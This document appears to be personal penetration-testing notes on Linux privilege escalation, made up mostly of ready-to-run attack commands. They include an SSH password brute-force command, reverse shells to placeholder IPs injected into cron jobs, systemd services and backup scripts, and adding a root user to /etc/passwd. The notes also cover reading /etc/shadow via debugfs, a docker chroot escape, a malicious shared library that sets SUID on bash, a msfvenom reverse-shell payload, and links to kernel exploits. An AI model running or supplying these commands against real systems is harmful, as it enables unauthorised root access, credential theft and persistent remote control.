
#### Credential Access

- reused passwords
- found credentials from config files
- credentials from local DB
- credentials from bash history 
- reused ssh keys
- check group privilege
- brute force attack
```
crackmapexec ssh <ip> -u <user> -p /usr/share/wordlists/rockyou.txt
```
#### Abusing Cron Jobs

we can modify the cron jobs that are running and add lines for revers shell for example 
if the job run as high privilege user we get high privilege shell

```
cat /etc/crontab
ls -lah /etc/cron*
crontab -l
grep "CRON" /var/log/syslog
```

- search for con job that run a file as root
- search for writeable Cron Job dependency files
- run pspy

#### Services
list writable services
```
find / -writable -name "*.service" 2>/dev/null
```

add
```
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<local-ip>/4444 0>&1'
```
#### Abusing Password Authentication

if there is misconfiguration and we have privilege to write to **/etc/passwd** we can add root user
```
# run on the terget

# generate a password hash
openssl passwd pass123

# write to /etc/passwd
echo "<user>:<hashed_password>:0:0:root:/root:/bin/bash" >> /etc/passwd
```
https://binaryregion.wordpress.com/2021/06/05/privilege-escalation-linux-adding-a-new-root-user/
MD5, SHA-256, or SHA-512

- /etc/passwd - write permission
- /etc/shadow - read permission
- /etc/sudoers - write permission
- /root/.ssh/ - read permissions

#### crack the hash

crack that hashes it the following files:
- /etc/passwd
- /etc/shadow

you can use John with unshadow commands
#### inspect services footprint

maybe there is footprint of service that revels the credentials

```
watch -n 1 "ps -aux | grep pass"
```

capture traffic in and out of the loopback interface
```
sudo tcpdump -i lo -A | grep "pass"
```

#### Groups

to check membership 
```
id
```

Interesting Groups:
- disk - read ssh keys, hashes in shadow file...
```
# check where / mounted

dora@dora:/tmp$ df -h
df -h
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.3G  55% /
udev                               947M     0  947M   0% /dev
tmpfs                              992M     0  992M   0% /dev/shm
. . .

# connect to mountand and cat /etc/shadow (for example)

dora@dora:/tmp$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs 1.45.5 (07-Jan-2020)
debugfs:  cat /etc/shadow
```
- adm - can read log file (apache log files: /var/log/apache2)
- sudo
- Shadow
- Staff 
- fail2ban
- Video
- Root
- Docker
```
 # list images
docker image

# chose an image and run
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash 
```
- lxc/lxd
- Auth

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group

#### Abusing  SUID/GUID Binaries and Capabilities

if script of command hash SUID permissions we can run it and it will execute as high privilege context

tools:
```
find / -perm -u=s -type f 2>/dev/null
```

```
ls -asl on /usr/bin directory
```

```
find / -type f -perm -4000 2>/dev/null
```

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null	
```

GTFOBins https://gtfobins.github.io/

common command:
- wget
- find
- cp
- php
- strace
- doas

#### search file

```
find / -type f -name "local.txt"

# find all files owned by root and writable to other users
find / -user root -perm -o+w -type f -name "*.sh" 2>/dev/null
```
#### Abusing Sudo

as non-privilege user we have sudo on specific command

check this
```
sudo -l
```

we can leverage this command because they running as high privilege user

tools:
- GTFOBins https://gtfobins.github.io/

#### object share injection

```
//gcc -shared -o libcustom.so -fPIC libcustom.c  
  
#include <stdio.h>  
#include <unistd.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
static void inject() __attribute__((constructor));  
  
void inject(){  
setuid(0);  
setgid(0);  
printf("I'm the bad library\n");  
system("chmod +s /bin/bash");  
}
```

https://vk9-sec.com/privilege-escalation-suid-sgid-executables-shared-object-injection/?source=post_page-----b362f337365c--------------------------------

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/ld.so.conf-example?source=post_page-----b362f337365c--------------------------------

another option is to compile revers shell to shared object
```
msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=<IP> LPORT=<PORT>
```
#### Exploiting Kernel Vulnerabilities

- looking for vulnerabilities in the system
- exploit services that running on the machine localhost
- binary file versions
- run `suggester.sh`  to see fit exploit

tools:
- metasploit
- searchsploit
- msvenom
- exploitDB

vulnerabilities for example:

- CVE-2021-3156 - sudo Baron Samedit: https://github.com/asepsaepdin/CVE-2021-3156
	- need make command on the target
	- Sudo before 1.9.5p2
- PwnKit: https://github.com/joeammond/CVE-2021-4034
	- need python install on the target
	- another exploit need gcc https://github.com/berdav/CVE-2021-4034
		- example of use: https://medium.com/@thetraphacker/proving-grounds-pg-zenphoto-writeup-8cd8218d9b26
		- kernel 1.8.23 
- JDWP exploitation script https://github.com/IOActive/jdwp-shellifier
- CVE-2022-0847-DirtyPipe-Exploits: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
	- need gcc install on the target
- GNU Screen 4.5.0 - Local Privilege Escalation exploit https://www.exploit-db.com/exploits/41154
	- need gcc install on the target
- kernel exploit: https://www.exploit-db.com/exploits/44298
	- need gcc / compile locally
	- kernel version: 4.4.0-116-generic
- RDS protocol https://www.exploit-db.com/exploits/15285

#### scripts

```
echo "/usr/bin/bash -l > /dev/tcp/<IP>/<PORT> 0<&1 2>&1" >> /var/backups/etc_Backup.sh 

echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" >> /var/backups/etc_Backup.sh 

echo "chmod u+s /bin/bash" >> /var/backups/etc_Backup.sh 

echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers

/bin/bash -i

/bin/sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

don't forget add `cmode +x`